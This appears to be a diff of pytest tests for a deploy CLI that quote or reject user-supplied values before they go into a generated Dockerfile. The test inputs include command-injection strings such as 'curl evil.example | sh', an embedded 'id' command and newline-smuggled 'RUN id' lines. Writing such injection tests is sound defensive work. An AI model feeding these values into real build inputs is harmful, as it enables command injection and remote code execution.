@@ -1280,41 +1280,54 @@ def test_assert_safe_dockerfile_token_skips_unset_value(
   assert cli_deploy._assert_safe_dockerfile_token(value, "project") is None
 
 
-def test_quote_dockerfile_cmd_value_quotes_shell_metacharacters() -> None:
+def test_dockerfile_cmd_flag_quotes_shell_metacharacters() -> None:
   """A value carrying a command separator is quoted whole."""
   assert (
-      cli_deploy._quote_dockerfile_cmd_value(
-          "memory://; curl evil.example | sh #", "memory_service_uri"
+      cli_deploy._dockerfile_cmd_flag(
+          "--memory_service_uri", "memory://; curl evil.example | sh #"
       )
-      == "'memory://; curl evil.example | sh #'"
+      == "--memory_service_uri='memory://; curl evil.example | sh #'"
   )
 
 
-def test_quote_dockerfile_cmd_value_escapes_embedded_single_quote() -> None:
+def test_dockerfile_cmd_flag_escapes_embedded_single_quote() -> None:
   """An embedded single quote cannot close the quoting."""
   assert (
-      cli_deploy._quote_dockerfile_cmd_value("a'; id #", "allow_origins")
-      == """'a'"'"'; id #'"""
+      cli_deploy._dockerfile_cmd_flag("--allow_origins", "a'; id #")
+      == """--allow_origins='a'"'"'; id #'"""
   )
 
 
 @pytest.mark.parametrize("newline", ["\n", "\r"])
-def test_quote_dockerfile_cmd_value_rejects_newline(newline: str) -> None:
+def test_assert_no_dockerfile_newline_rejects_newline(newline: str) -> None:
   """Quoting cannot contain a newline, so the value is rejected."""
   with pytest.raises(click.ClickException, match="Invalid trigger_sources"):
-    cli_deploy._quote_dockerfile_cmd_value(
+    cli_deploy._assert_no_dockerfile_newline(
         f"pubsub{newline}RUN id{newline}#", "trigger_sources"
     )
+
+
+@pytest.mark.parametrize("value", [None, "", "pubsub,eventarc"])
+def test_assert_no_dockerfile_newline_accepts_value_without_newline(
+    value: str | None,
+) -> None:
+  """An unset or single-line value is left alone."""
+  assert (
+      cli_deploy._assert_no_dockerfile_newline(value, "trigger_sources") is None
+  )
 
 
 @pytest.mark.parametrize(
     "value", ["http://localhost:3000,https://my-app.com", "pubsub,eventarc"]
 )
-def test_quote_dockerfile_cmd_value_leaves_ordinary_value_untouched(
+def test_dockerfile_cmd_flag_leaves_ordinary_value_untouched(
     value: str,
 ) -> None:
   """A legitimate value is byte-identical to what it is today."""
-  assert cli_deploy._quote_dockerfile_cmd_value(value, "allow_origins") == value
+  assert (
+      cli_deploy._dockerfile_cmd_flag("--allow_origins", value)
+      == f"--allow_origins={value}"
+  )
 
 
 @pytest.mark.parametrize("value", [None, ""])
@@ -1455,6 +1468,18 @@ def test_to_gke_shell_quotes_cmd_values(
         ("project", {"project": f"p\n{_INJECTED_RUN}"}),
         ("region", {"region": f"us-central1\n{_INJECTED_RUN}"}),
         ("trigger_sources", {"trigger_sources": f"pubsub\n{_INJECTED_RUN}"}),
+        (
+            "session_service_uri",
+            {"session_service_uri": f"sqlite:///a\n{_INJECTED_RUN}"},
+        ),
+        (
+            "artifact_service_uri",
+            {"artifact_service_uri": f"gs://a\n{_INJECTED_RUN}"},
+        ),
+        (
+            "memory_service_uri",
+            {"memory_service_uri": f"rag://m\n{_INJECTED_RUN}"},
+        ),
     ],
 )
 def test_to_agent_engine_rejects_injected_value(
@@ -1463,7 +1488,7 @@ def test_to_agent_engine_rejects_injected_value(
     field: str,
     overrides: Dict[str, Any],
 ) -> None:
-  """An injected value fails before the Agent Platform client is built."""
+  """An injected value fails before an Agent Runtime instance is created."""
   monkeypatch.setattr(shutil, "rmtree", _Recorder())
   calls: List[str] = []
   monkeypatch.setitem(sys.modules, "vertexai", _make_counting_vertexai(calls))
